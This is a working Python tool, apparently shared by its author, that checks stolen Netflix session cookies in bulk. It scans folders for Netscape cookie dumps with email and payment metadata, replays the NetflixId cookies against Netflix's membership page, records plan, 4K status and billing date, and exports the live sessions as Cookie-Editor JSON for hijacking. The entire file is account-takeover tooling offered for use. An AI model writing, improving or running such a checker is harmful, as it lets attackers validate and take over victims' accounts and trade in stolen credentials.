#!/usr/bin/env python3
import os
import re
import requests
import time
import json
import signal
import sys
from datetime import datetime
from collections import Counter

live_accounts = []
count = 0
fourk_count = 0

def signal_handler(sig, frame):
    """Handle CTRL+C - save progress before exit."""
    print("\n\n[!] CTRL+C detected! Saving progress...")
    save_results()
    print("[!] Exiting gracefully.")
    sys.exit(0)

def generate_cookie_json(account):
    """Generate Cookie-Editor compatible JSON untuk 1 akun."""
    cookies = account['cookies']
    result = []
    for name in ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'):
        if cookies.get(name):
            result.append({
                "domain": ".netflix.com",
                "name": name,
                "path": "/",
                "secure": True,
                "httpOnly": name in ('NetflixId', 'SecureNetflixId'),
                "sameSite": "unspecified",
                "value": cookies[name]
            })
    return result

def save_results():
    """Save live accounts ke live.txt."""
    global live_accounts, count, fourk_count

    if not live_accounts:
        print("[!] No live accounts to save.")
        return

    with open('live.txt', 'w', encoding='utf-8') as f:
        f.write(f"NETFLIX CHECKER - {count} LIVE\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 80 + "\n\n")

        for i, (acc, date, res) in enumerate(live_accounts, 1):
            payment = acc['metadata'].get('PAYMENT METHOD', '-')
            plan_text = acc['metadata'].get('PLAN', '')
            streams = plan_text.split('|')[-1].strip() if '|' in plan_text else '-'
            country = acc['metadata'].get('COUNTRY', '-')

            f.write(f"[{i:2d}] {acc['email']}\n")
            f.write(f"     Plan: {res} | Billing: {date}\n")
            f.write(f"     Payment: {payment} | Streams: {streams}\n")
            f.write(f"     Country: {country}\n")
            f.write("     🍪 Cookie JSON (copy & paste ke Cookie-Editor):\n")
            cookie_json = generate_cookie_json(acc)
            if cookie_json:
                f.write(json.dumps(cookie_json, indent=4, ensure_ascii=False))
                f.write("\n")
            f.write("-" * 60 + "\n")

    print(f"✅ Saved: live.txt ({count} accounts)")

    print(f"\n{'=' * 60}")
    print(f"🔥 LIVE: {count} | 4K: {fourk_count}")

    stats = Counter(res for _, _, res in live_accounts)
    for plan, num in stats.most_common():
        print(f"  {plan}: {num}")
    print(f"{'=' * 60}")

print(r"""
╔═╗╔═╗╦  ╔╦╗╔═╗╦═╗  ╔╦╗╔═╗╔╦╗╔═╗
╠╣ ║ ║║   ║║║╣ ╠╦╝   ║║║ ║ ║║║╣ 
╚  ╚═╝╩═╝═╩╝╚═╝╩╚═  ═╩╝╚═╝ ═╩╝╚═╝

            Checker Netflix Cookie Account V3
            By     : Kenjisubagja / Klikajar
            Github : kenjisubagja
            FB     : R Panji Subbagja
""")

signal.signal(signal.SIGINT, signal_handler)

def parse_netscape_file(filepath):
    """Parse Netscape HTTP Cookie File untuk mengambil cookies dan metadata."""
    cookies = {}
    metadata = {}
    email = 'Unknown'

    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                
                # 1. Tangani prefix #HttpOnly_ (kunci utama kenapa cookie Netflix gagal dibaca)
                if line.startswith('#HttpOnly_'):
                    line = line.replace('#HttpOnly_', '', 1)
                    
                # 2. Parse Metadata dari komentar (#)
                if line.startswith('#'):
                    match = re.match(r'#([A-Z_ ]+)\s*:\s*(.+)', line)
                    if match:
                        key = match.group(1).strip()
                        val = match.group(2).strip()
                        metadata[key] = val
                        if key == 'EMAIL':
                            email = val
                    continue

                # 3. Parse Cookies (Format Netscape dipisah spasi/tab)
                # Gunakan maxsplit=6 agar value cookie yang berisi spasi tidak terpotong
                parts = line.split(maxsplit=6)
                if len(parts) >= 7:
                    name = parts[5].strip()
                    value = parts[6].strip()
                    cookies[name] = value
                    
    except Exception:
        return None

    # 4. Filter: Jika ini bukan cookie Netflix (misal ChatGPT), abaikan filenya
    if 'NetflixId' not in cookies or 'SecureNetflixId' not in cookies:
        return None

    billing_date = metadata.get('EXPIRE', 'Unknown')

    return {
        'email': email,
        'cookies': cookies,
        'metadata': metadata,
        'billing_date': billing_date
    }

def check_netflix_account(account_data):
    """Check Netflix account using extracted cookies."""
    cookies = account_data['cookies']

    # Bersihkan cookie dari titik liar di ujung value
    for k in ['NetflixId', 'SecureNetflixId']:
        if k in cookies:
            cookies[k] = cookies[k].strip().rstrip('.')

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.netflix.com/browse',
        'Cache-Control': 'max-age=0'
    }

    try:
        session = requests.Session()
        session.get('https://www.netflix.com/browse', headers=headers, cookies=cookies, timeout=12)
        time.sleep(1)

        r = session.get('https://www.netflix.com/account/membership', headers=headers, timeout=12)

        if r.status_code != 200:
            return False, account_data.get('billing_date', ''), 'Dead'

        html = r.text

        # Check for 4K
        if re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I):
            plan_detected = '4K 🔥'
        else:
            plan_match = re.search(
                r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,30}?)<',
                html
            )
            plan_detected = plan_match.group(1).strip() if plan_match else 'Live'

        # Get next payment date
        date_match = re.search(
            r'<h3[^>]*data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
            html,
            re.DOTALL | re.I
        )

        date = date_match.group(1).strip() if date_match else account_data.get('billing_date', 'Live')

        if 'account-membership-page' in html:
            return True, date, plan_detected

        return False, account_data.get('billing_date', ''), 'Dead'
    except Exception:
        return False, account_data.get('billing_date', ''), 'Error'

def read_accounts_from_folders():
    """Scan folder dan hanya ambil file yang berisi Netflix cookies."""
    accounts = []
    for root, dirs, files in os.walk('.'):
        for file in files:
            if file.endswith('.txt') and file != 'live.txt':
                filepath = os.path.join(root, file)
                acc = parse_netscape_file(filepath)
                if acc: 
                    accounts.append(acc)
    return accounts

def main():
    global live_accounts, count, fourk_count

    accounts = read_accounts_from_folders()

    print(f"✅ Parsed Netflix accounts: {len(accounts)}")

    if not accounts:
        print("\n[!] Tidak ada file Netflix yang valid ditemukan! Pastikan format file-nya benar.")
        return

    print("[INFO] Press CTRL+C at any time to save progress and exit.\n")

    for i, acc in enumerate(accounts, 1):
        print(f"[{i:3d}/{len(accounts)}] Checking {acc['email'][:25]:<25}...", end=' ', flush=True)
        is_live, date, res = check_netflix_account(acc)

        if is_live:
            count += 1
            if '4K' in res:
                fourk_count += 1
                print(f"🎬 {res} | {date} 🔥 #{count}")
            else:
                print(f"✅ {res} | {date} #{count}")
            live_accounts.append((acc, date, res))
        else:
            print(f"❌ dead ({res})")

        time.sleep(2)

    print("\n" + "=" * 80)
    print(f"🔥 LIVE: {count} | 4K: {fourk_count}")

    stats = Counter(res for _, _, res in live_accounts)
    for plan, num in stats.most_common():
        print(f"  {plan}: {num}")

    save_results()
    print("\n🎉 DONE!")

if __name__ == "__main__":
    main()
